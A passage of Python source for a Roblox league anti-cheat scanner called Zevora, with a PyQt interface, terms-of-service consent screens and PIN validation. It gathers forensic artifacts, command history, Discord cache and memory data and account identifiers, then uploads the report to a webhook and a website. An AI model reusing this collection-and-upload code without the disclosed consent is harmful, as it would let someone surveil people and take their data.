            lines.append(f"    Path     : {h['path']}")
            lines.append(f"    Signature: {h['sig']}")
            if h.get('keywords'): lines.append(f"    Keywords : {', '.join(h['keywords'])}")
            lines.append("")

    if roblox_running and module_list:
        clean = [m for m in module_list if not m["suspicious"]]
        if clean:
            lines.append(f"\n  Trusted/expected modules ({len(clean)}):")
            for m in clean[:30]: lines.append(f"    ✓ {m['name']}")
            if len(clean) > 30: lines.append(f"    … and {len(clean)-30} more")

    if not hits:
        lines.append("  ✓ No injected or suspicious modules found.")
    return section("Memory / Injection Scan", lines), len(hits), hits


# ============================================================
#  run_full_scan
# ============================================================
def run_full_scan(league="?"):
    sb_t,sb_h,_         = scan_shellbags()
    bm_t,bm_h,_         = scan_bam()
    pf_t,pf_h,_         = scan_prefetch()
    ac_t,ac_h,_         = scan_appcompat()
    rl_t,rl_h,accs      = scan_roblox_logs()
    al_t,al_h,_         = scan_roblox_alts_registry()
    cs_t,cs_h,_         = scan_cheat_files()
    yr_t,yr_h,_         = scan_yara()
    us_t,us_h,us_l      = scan_unsigned()
    rb_t,rb_h,rb_l      = scan_recycle_bin()
    sm_t,sm_h,auto_fail = scan_sysmain()
    pr_t,pr_h,_         = scan_running_processes()
    cl_t,cl_h,cl_info   = scan_cleaners()
    nw_t,nw_h,vpn_info  = scan_network_vpn()
    dc_t,dc_h,dc_accs   = scan_discord_cache()
    dm_t,dm_h,_         = scan_discord_memory()
    fr_t,fr_h,fr_text   = scan_factory_reset()
    ff_t,ff_h,ff_hits   = scan_fastflags()
    dv_t,dv_w,dv_inf    = scan_drives()
    ev_t,ev_h,_         = scan_event_log()
    jl_t,jl_h,_         = scan_jumplists()
    lk_t,lk_h,_         = scan_lnk_files()
    di_t,di_h,_         = scan_deleted_integrity()
    pw_t,pw_h,pw_list   = scan_power_events()
    tp_t,tp_h,_         = scan_two_pc_indicators()
    dr_t,dr_h,_         = scan_deleted_cheat_recovery()
    eh_t,eh_fc,eh_list  = scan_execution_history()
    mr_t,mr_h,mr_list   = scan_mft_deleted_recovery()
    ch_t,ch_h,_         = scan_cmd_history()
    mi_t,mi_h,_         = scan_memory_injection()
    be_t,be_h,_         = scan_browser_extensions()

    total = (sb_h+bm_h+pf_h+ac_h+cs_h+yr_h+us_h+rb_h+sm_h+
             ff_h+pr_h+cl_h+ev_h+jl_h+lk_h+di_h+tp_h+dr_h+mr_h+ch_h+mi_h+be_h)

    roblox_list = []
    if isinstance(accs, list):
        for a in accs:
            if isinstance(a, dict): roblox_list.append(a)
            else: roblox_list.append({"username":str(a),"userid":None,"sources":[],"placeids":[],"last_seen":None})

    return {
        "shellbags":sb_t,"bam":bm_t,"prefetch":pf_t,"appcompat":ac_t,
        "roblox":rl_t,"cheat":cs_t,"yara":yr_t,"unsigned":us_t,
        "recycle":rb_t,"sysmain":sm_t,"discord":dc_t,"discord_memory":dm_t,
        "processes":pr_t,"cleaners":cl_t,"network":nw_t,"registry_extra":al_t,
        "eventlog":ev_t,"jumplists":jl_t,"lnkfiles":lk_t,"deleted_int":di_t,
        "power_events":pw_t,"two_pc":tp_t,"deleted_recovery":dr_t,
        "exec_history_text":eh_t,"exec_history":eh_list,
        "mft_recovery":mr_t,"cmd_history":ch_t,"memory_injection":mi_t,
        "browser_extensions":be_t,
        "shellbag_hits":sb_h,"bam_hits":bm_h,"prefetch_hits":pf_h,
        "appcompat_hits":ac_h,"cheat_hits":cs_h,"yara_hits":yr_h,
        "unsigned_hits":us_l,"sysmain_hits":sm_h,"sysmain_autofail":auto_fail,
        "fastflag_hits":ff_h,"process_hits":pr_h,"cleaner_hits":cl_h,
        "eventlog_hits":ev_h,"jumplist_hits":jl_h,"lnk_hits":lk_h,
        "deleted_hits":di_h,"roblox_log_hits":rl_h,
        "power_hits":pw_h,"two_pc_hits":tp_h,"recovery_hits":dr_h,
        "discord_memory_hits":dm_h,"mft_recovery_hits":mr_h,
        "cmd_history_hits":ch_h,"memory_injection_hits":mi_h,
        "browser_extension_hits":be_h,
        "roblox_accounts":roblox_list,"discord_accounts":dc_accs,
        "total_hits":total,"verdict":"REVIEW","league":league,
        "vpn_detected":bool(vpn_info and "vpn" in str(vpn_info).lower()),
        "vpn_info":"[Redacted]","cleaner_info":cl_info,
        "report":{
            "shellbag_hits":sb_h,"bam_hits":bm_h,"prefetch_hits":pf_h,
            "appcompat_hits":ac_h,"cheat_hits":cs_h,"yara_hits":yr_h,
            "unsigned_count":len(us_l) if isinstance(us_l,list) else us_h,
            "sysmain_hits":sm_h,"sysmain_autofail":auto_fail,
            "roblox_hits":rl_h,"fastflags":ff_hits,
            "discord_accounts":dc_accs,"factory_resets":fr_text,
            "drive_info":dv_inf,"drive_warn":dv_w,
            "cleaner_info":cl_info,"process_hits":pr_h,"cleaner_hits":cl_h,
            "eventlog_hits":ev_h,"jumplist_hits":jl_h,"lnk_hits":lk_h,
            "deleted_hits":di_h,"exec_history":eh_list,
            "power_hits":pw_h,"two_pc_hits":tp_h,"recovery_hits":dr_h,
            "discord_memory_hits":dm_h,"mft_recovery_hits":mr_h,
            "cmd_history_hits":ch_h,"memory_injection_hits":mi_h,
            "browser_extension_hits":be_h,
        },
        "full_report":"\n".join([
            f"ZEVORA SCANNER v5  |  {now_str()}  |  User: {current_user()}  |  League: {league}",
            "="*60,
            sb_t,bm_t,pf_t,ac_t,rl_t,al_t,cs_t,yr_t,us_t,rb_t,sm_t,
            pr_t,cl_t,nw_t,dc_t,dm_t,fr_t,ff_t,dv_t,ev_t,jl_t,lk_t,
            di_t,pw_t,tp_t,dr_t,eh_t,mr_t,ch_t,mi_t,be_t,
            f"\nHITS: {total}",
        ]),
    }


# ============================================================
#  Rounded-corner widget kit (ONE definition — duplicates removed)
# ============================================================
def enable_acrylic_blur(hwnd, tint_rgba=(10, 15, 12, 140)):
    """
    Calls the undocumented but widely-used Windows DWM
    SetWindowCompositionAttribute to blur whatever is behind
    this window (desktop, other apps) — real OS-level glass.
    Silently no-ops on non-Windows / if the call fails.
    """
    try:
        class ACCENT_POLICY(ctypes.Structure):
            _fields_ = [
                ("AccentState", ctypes.c_int),
                ("AccentFlags", ctypes.c_int),
                ("GradientColor", ctypes.c_uint),
                ("AnimationId", ctypes.c_int),
            ]
 
        class WINCOMPATTRDATA(ctypes.Structure):
            _fields_ = [
                ("Attribute", ctypes.c_int),
                ("Data", ctypes.POINTER(ACCENT_POLICY)),
                ("SizeOfData", ctypes.c_size_t),
            ]
 
        ACCENT_ENABLE_ACRYLICBLURBEHIND = 4
        WCA_ACCENT_POLICY = 19
 
        r, g, b, a = tint_rgba
        gradient_color = (a << 24) | (b << 16) | (g << 8) | r  # ABGR packed
 
        accent = ACCENT_POLICY()
        accent.AccentState = ACCENT_ENABLE_ACRYLICBLURBEHIND
        accent.AccentFlags = 2
        accent.GradientColor = gradient_color
        accent.AnimationId = 0
 
        data = WINCOMPATTRDATA()
        data.Attribute = WCA_ACCENT_POLICY
        data.Data = ctypes.pointer(accent)
        data.SizeOfData = ctypes.sizeof(accent)
 
        set_attr = ctypes.windll.user32.SetWindowCompositionAttribute
        set_attr(int(hwnd), ctypes.pointer(data))
        return True
    except Exception:
        return False
 
 
# ============================================================
#  iOS 17–inspired glass design system
# ============================================================
class C:
    # Base surfaces
    BG          = "#0b0b0d"
    BG2         = "#141416"
    BG3         = "#1c1c1e"

    # Frosted materials (iOS dark vibrancy)
    GLASS       = "rgba(255,255,255,0.07)"
    GLASS2      = "rgba(255,255,255,0.11)"
    GLASS3      = "rgba(255,255,255,0.15)"
    GLASS_INPUT = "rgba(255,255,255,0.06)"
    GLASS_H     = "rgba(255,255,255,0.14)"

    # Specular edges — top highlight, subtle side/bottom
    EDGE_TOP    = "rgba(255,255,255,0.32)"
    EDGE        = "rgba(255,255,255,0.14)"
    EDGE_DIM    = "rgba(255,255,255,0.06)"

    # Typography colors (iOS label hierarchy)
    FG          = "#ffffff"
    FG2         = "rgba(235,235,245,0.72)"
    FG3         = "rgba(235,235,245,0.38)"

    # System green accent
    ACCENT      = "#30d158"
    ACCENT2     = "#28b84c"
    ACCENT_SOFT = "rgba(48,209,88,0.18)"
    ACCENT_GLOW = "rgba(48,209,88,0.55)"
    RED         = "#ff453a"
    RED_SOFT    = "rgba(255,69,58,0.16)"

    MONO        = "SF Mono, Consolas, monospace"
    UI          = "Segoe UI Variable, Segoe UI, system-ui, sans-serif"

    R_L = 22
    R_M = 16
    R_S = 12
    R_PILL = 22


def _glass_shadow(widget, blur=36, y=10, alpha=70):
    fx = QGraphicsDropShadowEffect(widget)
    fx.setBlurRadius(blur)
    fx.setOffset(0, y)
    fx.setColor(QColor(0, 0, 0, alpha))
    widget.setGraphicsEffect(fx)
    return fx


def _ios_checkbox_style():
    return f"""
        QCheckBox {{
            color: {C.FG2};
            font-family: {C.UI};
            font-size: 12px;
            spacing: 12px;
            padding: 10px 12px;
        }}
        QCheckBox::indicator {{
            width: 22px;
            height: 22px;
            border-radius: 7px;
            border: 1.5px solid {C.EDGE};
            background: {C.GLASS_INPUT};
        }}
        QCheckBox::indicator:hover {{
            background: {C.GLASS2};
            border-color: {C.EDGE_TOP};
        }}
        QCheckBox::indicator:checked {{
            background: {C.ACCENT};
            border-color: {C.ACCENT};
        }}
    """


def apply_ios_app_theme(app: QApplication):
    app.setStyle("Fusion")
    app.setStyleSheet(f"""
        QWidget {{
            font-family: {C.UI};
            color: {C.FG};
        }}
        QScrollBar:vertical {{
            background: transparent;
            width: 6px;
            margin: 4px 2px;
        }}
        QScrollBar::handle:vertical {{
            background: rgba(255,255,255,0.18);
            border-radius: 3px;
            min-height: 24px;
        }}
        QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical {{
            height: 0px;
        }}
        QScrollBar:horizontal {{
            background: transparent;
            height: 6px;
        }}
        QScrollBar::handle:horizontal {{
            background: rgba(255,255,255,0.18);
            border-radius: 3px;
        }}
    """)


class GlassShell(QWidget):
    """Full-window ambient wallpaper with transparent content overlay."""
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setStyleSheet("background: transparent;")
        self._ambient = AmbientBackground(self)
        self._content = QWidget(self)
        self._content.setStyleSheet("background: transparent;")
        self._layout = QVBoxLayout(self._content)
        self._layout.setContentsMargins(0, 0, 0, 0)
        self._layout.setSpacing(0)

    def layout(self):
        return self._layout

    def resizeEvent(self, event):
        super().resizeEvent(event)
        self._ambient.setGeometry(self.rect())
        self._content.setGeometry(self.rect())


class AmbientBackground(QWidget):
    """Soft iOS-style wallpaper blobs behind frosted glass."""
    def paintEvent(self, _event):
        p = QPainter(self)
        p.setRenderHint(QPainter.RenderHint.Antialiasing)
        p.fillRect(self.rect(), QColor(C.BG))

        blobs = [
            (0.18, 0.12, 0.55, QColor(48, 209, 88, 38)),
            (0.82, 0.08, 0.45, QColor(100, 210, 255, 28)),
            (0.55, 0.92, 0.50, QColor(191, 90, 242, 22)),
        ]
        for cx, cy, r, color in blobs:
            grad = QRadialGradient(self.width() * cx, self.height() * cy, self.width() * r)
            grad.setColorAt(0.0, color)
            grad.setColorAt(1.0, QColor(0, 0, 0, 0))
            p.setBrush(QBrush(grad))
            p.setPen(Qt.PenStyle.NoPen)
            p.drawEllipse(QRectF(
                self.width() * cx - self.width() * r,
                self.height() * cy - self.width() * r,
                self.width() * r * 2,
                self.width() * r * 2,
            ))
        p.end()


def _logo_pixmap(size=32):
    """iOS squircle app icon with gradient fill."""
    pm = QPixmap(size, size)
    pm.fill(Qt.GlobalColor.transparent)
    p = QPainter(pm)
    p.setRenderHint(QPainter.RenderHint.Antialiasing)
    path = QPainterPath()
    r = size * 0.225
    path.addRoundedRect(0, 0, size, size, r, r)
    grad = QLinearGradient(0, 0, size, size)
    grad.setColorAt(0.0, QColor("#34d399"))
    grad.setColorAt(0.5, QColor("#30d158"))
    grad.setColorAt(1.0, QColor("#059669"))
    p.fillPath(path, grad)
    # inner highlight
    hi = QLinearGradient(0, 0, 0, size * 0.5)
    hi.setColorAt(0.0, QColor(255, 255, 255, 55))
    hi.setColorAt(1.0, QColor(255, 255, 255, 0))
    p.fillPath(path, hi)
    p.setPen(Qt.PenStyle.NoPen)
    p.setBrush(QColor("#ffffff"))
    m = size * 0.26
    zw = size - 2 * m
    th = max(2, int(size * 0.10))
    p.drawRoundedRect(int(m), int(m), int(zw), th, 2, 2)
    p.drawRoundedRect(int(m), int(size - m - th), int(zw), th, 2, 2)
    diag = QPainterPath()
    diag.moveTo(m + zw, m + th)
    diag.lineTo(m + zw, m + th + th * 0.5)
    diag.lineTo(m, size - m - th)
    diag.lineTo(m, size - m - th - th * 0.5)
    diag.closeSubpath()
    p.drawPath(diag)
    p.end()
    return pm


class GlassCard(QFrame):
    """Frosted elevated panel with specular top edge."""
    def __init__(self, radius=C.R_M, fill=C.GLASS, elevated=False, shadow=True, parent=None):
        super().__init__(parent)
        if elevated:
            fill = C.GLASS2
        self.setStyleSheet(f"""
            GlassCard {{
                background-color: {fill};
                border: 1px solid {C.EDGE_DIM};
                border-top: 1px solid {C.EDGE_TOP};
                border-radius: {radius}px;
            }}
        """)
        self._layout = QVBoxLayout(self)
        self._layout.setContentsMargins(4, 4, 4, 4)
        if shadow:
            _glass_shadow(self, blur=28, y=8, alpha=55)

    def layout(self):
        return self._layout


class GlassButton(QPushButton):
    """iOS-style pill button — filled accent or frosted secondary."""
    def __init__(self, text, accent=False, radius=C.R_PILL, parent=None):
        super().__init__(text, parent)
        self.accent = accent
        self.setCursor(Qt.CursorShape.PointingHandCursor)
        self.setMinimumHeight(48)
        self._radius = radius
        self._apply_style()

    def _apply_style(self):
        if self.accent:
            self.setStyleSheet(f"""
                QPushButton {{
                    background-color: {C.ACCENT};
                    color: #052e16;
                    border: 1px solid rgba(255,255,255,0.35);
                    border-top: 1px solid rgba(255,255,255,0.55);
                    border-radius: {self._radius}px;
                    font-family: {C.UI};
                    font-weight: 600;
                    font-size: 15px;
                    padding: 12px 24px;
                }}
                QPushButton:hover {{
                    background-color: #3dde6a;
                }}
                QPushButton:pressed {{
                    background-color: {C.ACCENT2};
                }}
                QPushButton:disabled {{
                    background-color: {C.GLASS};
                    color: {C.FG3};
                    border: 1px solid {C.EDGE_DIM};
                }}
            """)
        else:
            self.setStyleSheet(f"""
                QPushButton {{
                    background-color: {C.GLASS2};
                    color: {C.FG};
                    border: 1px solid {C.EDGE};
                    border-top: 1px solid {C.EDGE_TOP};
                    border-radius: {self._radius}px;
                    font-family: {C.UI};
                    font-weight: 600;
                    font-size: 15px;
                    padding: 12px 24px;
                }}
                QPushButton:hover {{
                    background-color: {C.GLASS3};
                }}
                QPushButton:pressed {{
                    background-color: {C.GLASS};
                }}
                QPushButton:disabled {{
                    background-color: {C.GLASS_INPUT};
                    color: {C.FG3};
                }}
            """)

    def set_accent(self, accent: bool):
        self.accent = accent
        self._apply_style()


class GlassProgressBar(QProgressBar):
    """Thin iOS-style track with glowing fill."""
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setMinimum(0)
        self.setMaximum(100)
        self.setValue(0)
        self.setTextVisible(False)
        self.setFixedHeight(8)
        self.setStyleSheet(f"""
            QProgressBar {{
                background-color: {C.GLASS_INPUT};
                border: 1px solid {C.EDGE_DIM};
                border-radius: 4px;
            }}
            QProgressBar::chunk {{
                background: qlineargradient(
                    x1:0, y1:0, x2:1, y2:0,
                    stop:0 {C.ACCENT2}, stop:1 {C.ACCENT}
                );
                border-radius: 4px;
            }}
        """)


class GlassHeader(QFrame):
    """Translucent frosted nav bar."""
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setFixedHeight(56)
        self.setStyleSheet(f"""
            GlassHeader {{
                background-color: {C.GLASS2};
                border-bottom: 1px solid {C.EDGE_DIM};
                border-top: 1px solid {C.EDGE_TOP};
            }}
        """)
        self._layout = QHBoxLayout(self)
        self._layout.setContentsMargins(20, 0, 20, 0)
        self._layout.setSpacing(12)

    def layout(self):
        return self._layout


def make_window_glass(win: QWidget, tint=(22, 22, 24, 210)):
    """Frosted window shell + native Windows acrylic blur."""
    win.setAttribute(Qt.WidgetAttribute.WA_TranslucentBackground, False)
    win.setStyleSheet(f"background-color: rgba({tint[0]},{tint[1]},{tint[2]},{tint[3]});")
    try:
        hwnd = int(win.winId())
        enable_acrylic_blur(hwnd, tint_rgba=(tint[0], tint[1], tint[2], min(tint[3], 180)))
    except Exception:
        pass


def brand_row(bg="transparent", size=28, text_size=15):
    row = QWidget()
    row.setStyleSheet(f"background: {bg};")
    h = QHBoxLayout(row)
    h.setContentsMargins(0, 0, 0, 0)
    h.setSpacing(10)
    logo = QLabel()
    logo.setPixmap(_logo_pixmap(size))
    logo.setFixedSize(size, size)
    h.addWidget(logo)
    name = QLabel("Zevora")
    name.setFont(QFont("Segoe UI", text_size, QFont.Weight.Bold))
    name.setStyleSheet(f"color: {C.FG}; letter-spacing: 0.3px;")
    h.addWidget(name)
    h.addStretch()
    return row


def _screen_title(text, size=28):
    lbl = QLabel(text)
    lbl.setFont(QFont("Segoe UI", size, QFont.Weight.Bold))
    lbl.setStyleSheet(f"color: {C.FG};")
    lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
    return lbl


def _screen_subtitle(text):
    lbl = QLabel(text)
    lbl.setStyleSheet(f"color: {C.FG2}; font-size: 13px; font-weight: 400;")
    lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
    return lbl


def _status_orb(color=C.ACCENT, size=72):
    """Circular glass status icon container."""
    orb = QFrame()
    orb.setFixedSize(size, size)
    orb.setStyleSheet(f"""
        QFrame {{
            background-color: {C.ACCENT_SOFT if color == C.ACCENT else C.RED_SOFT};
            border: 1px solid {C.EDGE};
            border-top: 1px solid {C.EDGE_TOP};
            border-radius: {size // 2}px;
        }}
    """)
    lay = QVBoxLayout(orb)
    lay.setContentsMargins(0, 0, 0, 0)
    icon = QLabel("✓" if color == C.ACCENT else "✗")
    icon.setFont(QFont("Segoe UI", size // 2, QFont.Weight.Bold))
    icon.setStyleSheet(f"color: {color}; background: transparent;")
    icon.setAlignment(Qt.AlignmentFlag.AlignCenter)
    lay.addWidget(icon)
    return orb
 
 
# ============================================================
#  Worker — runs the scan + upload off the UI thread
# ============================================================
class ScanWorker(QObject):
    progress   = pyqtSignal(int, str, str, str)   # pct, title, sub, detail
    finished   = pyqtSignal(bool, str)            # success, error_msg
 
    def __init__(self, league, pin):
        super().__init__()
        self.league = league
        self.pin = pin
 
    def run(self):
        steps = [
            (8,  "Scanning System","Checking ShellBags & BAM…",        "Registry forensics"),
            (16, "Scanning System","Checking Prefetch…",                "Execution history"),
            (22, "Scanning System","Checking AppCompat…",               "Program launch history"),
            (29, "Scanning System","Scanning Roblox logs…",             "Account & FastFlag detection"),
            (36, "Scanning System","Scanning cheat files…",             "Keyword & hash scan"),
            (43, "Scanning System","Running heuristics…",               "YARA / PE header"),
            (49, "Scanning System","Checking unsigned executables…",    "Signature verification"),
            (54, "Scanning System","Checking recycle bin…",             "Deleted file evidence"),
            (59, "Scanning System","Checking event log…",               "Security log analysis"),
            (63, "Scanning System","Checking Discord cache…",           "Account detection"),
            (67, "Scanning System","Checking Discord downloads…",       "CDN history scan"),
            (71, "Scanning System","Checking logon sessions…",          "Power timeline"),
            (75, "Scanning System","Checking 2-PC indicators…",         "Stream bypass detection"),
            (79, "Scanning System","Recovering deleted files…",         "Forensic recovery"),
            (83, "Scanning System","Collecting execution history…",     "Today's activity"),
            (88, "Scanning System","Finalizing scan…",                  "Compiling results"),
            (93, "Scanning System","Finalizing scan…",                  "Preparing to send"),
        ]
 
        def _ticker():
            for pct, title, sub, detail in steps:
                time.sleep(0.4)
                self.progress.emit(pct, title, sub, detail)
 
        ticker_thread = threading.Thread(target=_ticker, daemon=True)
        ticker_thread.start()
 
        try:
            results = run_full_scan(league=self.league)
        except Exception:
            import traceback
            err = traceback.format_exc()
            try:
                log = os.path.join(os.path.expanduser("~"), "Desktop", "zevora_error.txt")
                open(log, "w", encoding="utf-8").write(f"Scan Error\n{now_str()}\n\n{err}")
            except Exception:
                pass
            self.finished.emit(False, err)
            return
 
        self.progress.emit(96, "Scanning System", "Sending Results", "Uploading…")
        send_webhook(results)
        ok, err = send_website(results, self.pin)
        if ok:
            self.progress.emit(100, "Scanning System", "Sending Results", "Complete ✓")
            self.finished.emit(True, "")
        else:
            try:
                log = os.path.join(os.path.expanduser("~"), "Desktop", "zevora_error.txt")
                open(log, "w", encoding="utf-8").write(f"Send Error\n{now_str()}\nPIN:{self.pin}\n\n{err}")
            except Exception:
                pass
            self.finished.emit(False, f"Send failed: {err}")
 
 
class PinCheckWorker(QObject):
    result = pyqtSignal(bool, str, str)  # ok, league, error
 
    def __init__(self, pin):
        super().__init__()
        self.pin = pin
 
    def run(self):
        try:
            data = json.dumps({"pin": self.pin, "league": "AUTO"}).encode()
            req = urllib.request.Request(
                f"{WEBSITE_URL}/api/validate_pin", data=data,
                headers={"Content-Type": "application/json", "User-Agent": "ZevoraScanner/6.0"},
                method="POST")
            try:
                with urllib.request.urlopen(req, context=_ssl_ctx(), timeout=12) as r:
                    body = json.loads(r.read().decode())
            except urllib.error.HTTPError as e:
                try:
                    body = json.loads(e.read().decode())
                except Exception:
                    body = {"error": f"Server error {e.code}"}
                self.result.emit(False, "", body.get("error", "Invalid PIN"))
                return
            if body.get("ok") or body.get("valid"):
                self.result.emit(True, body.get("league", "UFF"), "")
            else:
                self.result.emit(False, "", body.get("error", "Invalid or already used PIN"))
        except Exception as e:
            self.result.emit(False, "", f"Connection error: {e}")
 
 
# ============================================================
#  Main window — single QWidget, screens swapped via QStackedLayout-ish approach
# ============================================================
class MainWindow(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowFlag(Qt.WindowType.FramelessWindowHint, False)
        self.setWindowTitle("Zevora")
        self._pin = ""
        self._league = "UFF"
        self._thread = None
        self._worker = None
        self._build_tos_screen()

    def _root_shell(self):
        """Ambient wallpaper + frosted shell for every screen."""
        self._clear()
        make_window_glass(self)
        outer = QVBoxLayout(self)
        outer.setContentsMargins(0, 0, 0, 0)
        outer.setSpacing(0)
        shell = GlassShell()
        outer.addWidget(shell)
        return shell, shell.layout()

    # ── shared chrome ──
    def _header(self, parent_layout, extra_widget=None):
        hdr = GlassHeader()
        hdr.layout().addWidget(brand_row())
        if extra_widget:
            hdr.layout().addStretch()
            hdr.layout().addWidget(extra_widget)
        parent_layout.addWidget(hdr)

    def _league_badge(self, text):
        lbl = QLabel(f"  {text}  ")
        lbl.setStyleSheet(f"""
            background-color: {C.ACCENT_SOFT};
            color: {C.ACCENT};
            border: 1px solid rgba(48,209,88,0.35);
            border-top: 1px solid rgba(48,209,88,0.55);
            border-radius: 999px;
            padding: 5px 12px;
            font-weight: 600;
            font-size: 11px;
            letter-spacing: 0.4px;
        """)
        return lbl
 
    def _clear(self):
        old = self.layout()
        if old is not None:
            while old.count():
                item = old.takeAt(0)
                w = item.widget()
                if w:
                    w.deleteLater()
            QWidget().setLayout(old)  # detach
 
    # ── SCREEN 1: Terms & Services ──
    def _build_tos_screen(self):
        self.resize(580, 680)
        self._center()
        shell, root = self._root_shell()
        self._header(root)

        body = QWidget()
        body.setStyleSheet("background: transparent;")
        bl = QVBoxLayout(body)
        bl.setContentsMargins(32, 24, 32, 28)
        bl.setSpacing(12)
        root.addWidget(body, stretch=1)

        bl.addWidget(_screen_title("Terms & Services", 26))
        bl.addWidget(_screen_subtitle("Please read carefully before continuing"))
        bl.addSpacing(4)

        tos_card = GlassCard(radius=C.R_L, elevated=True)
        bl.addWidget(tos_card, stretch=1)
        txt = QTextEdit()
        txt.setReadOnly(True)
        txt.setStyleSheet(f"""
            QTextEdit {{
                background: transparent;
                color: {C.FG2};
                border: none;
                font-family: {C.UI};
                font-size: 12px;
                line-height: 1.45;
                padding: 16px 18px;
            }}
        """)
        txt.setPlainText(
            "This is a binding legal agreement between you (the person running this "
            "software, and where applicable the person who requested the scan) and the "
            "creator of Zevora (the \"Creator\"). If you do not agree, do not use Zevora "
            "and close this window.\n\n"
            "1. What Zevora Does & Your Informed Consent\n"
            "Zevora reads forensic artifacts from THIS computer and transmits the results "
            "to the person or organization that gave you your PIN (the \"Requesting Party\"). "
            "By continuing, you voluntarily and knowingly consent to Zevora accessing this "
            "device and collecting and transmitting information that may include:\n\n"
            "• System and OS configuration and install history\n"
            "• Records of programs run, installed, opened, or deleted (prefetch, registry, "
            "event logs, USN/MFT, shellbags, USB history, Recycle Bin, and similar)\n"
            "• Roblox and Discord account identifiers and game log data\n"
            "• Download links and file references found in application memory\n"
            "• FastFlag configurations and active Roblox client settings\n\n"
            "2. No Warranty\n"
            "This software is provided as-is. The Creator is not responsible for any "
            "actions taken by the Requesting Party based on scan results.\n\n"
            "3. Unauthorized Usage\n"
            "If the league or individual using this software on you is NOT authorized, "
            "report it immediately by DMing Discord user: converts_19942."
        )
        tos_card.layout().addWidget(txt)

        chk1_card = GlassCard(radius=C.R_M)
        self._chk1 = QCheckBox(
            "I have read, understand, and agree to the Terms of Service, and I\n"
            "voluntarily consent to this scan and the collection of my data")
        self._chk1.setStyleSheet(_ios_checkbox_style())
        self._chk1.stateChanged.connect(self._check_both)
        chk1_card.layout().addWidget(self._chk1)
        bl.addWidget(chk1_card)

        chk2_card = GlassCard(radius=C.R_M)
        self._chk2 = QCheckBox(
            "I certify, under penalty of perjury under the laws of the United States,\n"
            "that I own this device or have explicit, documented authorization to scan it")
        self._chk2.setStyleSheet(_ios_checkbox_style())
        self._chk2.stateChanged.connect(self._check_both)
        chk2_card.layout().addWidget(self._chk2)
        bl.addWidget(chk2_card)

        btn_row = QHBoxLayout()
        btn_row.setSpacing(12)
        cancel_btn = GlassButton("Cancel")
        cancel_btn.clicked.connect(self.close)
        btn_row.addWidget(cancel_btn)
        btn_row.addStretch()
        self._accept_btn = GlassButton("Accept & Continue", accent=False)
        self._accept_btn.setEnabled(False)
        self._accept_btn.clicked.connect(self._build_pin_screen)
        btn_row.addWidget(self._accept_btn)
        bl.addLayout(btn_row)

        self.show()
 
    def _check_both(self):
        both = self._chk1.isChecked() and self._chk2.isChecked()
        self._accept_btn.setEnabled(both)
        self._accept_btn.set_accent(both)
 
    # ── SCREEN 2: PIN entry ──
    def _build_pin_screen(self):
        self.resize(460, 400)
        self._center()
        shell, root = self._root_shell()
        self._header(root)

        body = QWidget()
        body.setStyleSheet("background: transparent;")
        bl = QVBoxLayout(body)
        bl.setContentsMargins(36, 32, 36, 32)
        bl.setSpacing(8)
        root.addWidget(body, stretch=1)

        bl.addWidget(_screen_title("Enter PIN", 24))
        bl.addWidget(_screen_subtitle("Enter the PIN provided by your screenshare agent."))
        bl.addSpacing(20)

        pin_card = GlassCard(radius=C.R_M, elevated=True)
        self._pin_input = QLineEdit()
        self._pin_input.setPlaceholderText("• • • • • •")
        self._pin_input.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self._pin_input.setFont(QFont("Consolas", 20, QFont.Weight.Bold))
        self._pin_input.setStyleSheet(f"""
            QLineEdit {{
                background: transparent;
                border: none;
                color: {C.ACCENT};
                padding: 18px 16px;
                letter-spacing: 6px;
            }}
            QLineEdit::placeholder {{
                color: {C.FG3};
                letter-spacing: 4px;
            }}
        """)
        self._pin_input.returnPressed.connect(self._do_pin)
        pin_card.layout().addWidget(self._pin_input)
        bl.addWidget(pin_card)
        bl.addSpacing(10)

        self._pin_err = QLabel("")
        self._pin_err.setStyleSheet(f"color: {C.RED}; font-size: 12px; padding-left: 4px;")
        self._pin_err.setAlignment(Qt.AlignmentFlag.AlignCenter)
        bl.addWidget(self._pin_err)
        bl.addSpacing(6)

        self._pin_btn = GlassButton("Start Scan", accent=True)
        self._pin_btn.clicked.connect(self._do_pin)
        bl.addWidget(self._pin_btn)
        bl.addStretch()

        self._pin_input.setFocus()
 
    def _do_pin(self):
        pin = self._pin_input.text().strip().upper()
        if not pin:
            self._pin_err.setText("Enter a PIN to continue.")
            return
        self._pin_btn.setEnabled(False)
        self._pin_btn.setText("Checking…")
        self._pin_err.setText("")
 
        self._pin_worker = PinCheckWorker(pin)
        self._pin_thread = threading.Thread(target=self._pin_worker.run, daemon=True)
        self._pin_worker.result.connect(self._on_pin_result, Qt.ConnectionType.QueuedConnection)
        self._pending_pin = pin
        self._pin_thread.start()
 
    def _on_pin_result(self, ok, league, err):
        if ok:
            self._pin = self._pending_pin
            self._league = league
            self._build_scan_screen()
        else:
            self._pin_btn.setEnabled(True)
            self._pin_btn.setText("Start Scan")
            self._pin_err.setText(f"✗  {err}")
 
    # ── SCREEN 3: Scanning ──
    def _build_scan_screen(self):
        self.resize(580, 440)
        self._center()
        self.setWindowTitle("Zevora — Scanning")
        shell, root = self._root_shell()
        badge = self._league_badge(self._league)
        self._header(root, extra_widget=badge)

        body = QWidget()
        body.setStyleSheet("background: transparent;")
        bl = QVBoxLayout(body)
        bl.setContentsMargins(48, 48, 48, 48)
        bl.setSpacing(8)
        root.addWidget(body, stretch=1)

        scan_card = GlassCard(radius=C.R_L, elevated=True)
        card_lay = scan_card.layout()
        card_lay.setContentsMargins(28, 28, 28, 28)
        card_lay.setSpacing(10)

        self._scan_title = QLabel("Scanning System")
        self._scan_title.setFont(QFont("Segoe UI", 22, QFont.Weight.Bold))
        self._scan_title.setStyleSheet(f"color: {C.FG};")
        card_lay.addWidget(self._scan_title)

        self._scan_sub = QLabel("Initializing…")
        self._scan_sub.setStyleSheet(f"color: {C.FG2}; font-size: 13px;")
        card_lay.addWidget(self._scan_sub)
        card_lay.addSpacing(20)

        self._bar = GlassProgressBar()
        card_lay.addWidget(self._bar)
        card_lay.addSpacing(8)

        self._pct_lbl = QLabel("0%")
        self._pct_lbl.setFont(QFont("Segoe UI", 15, QFont.Weight.Bold))
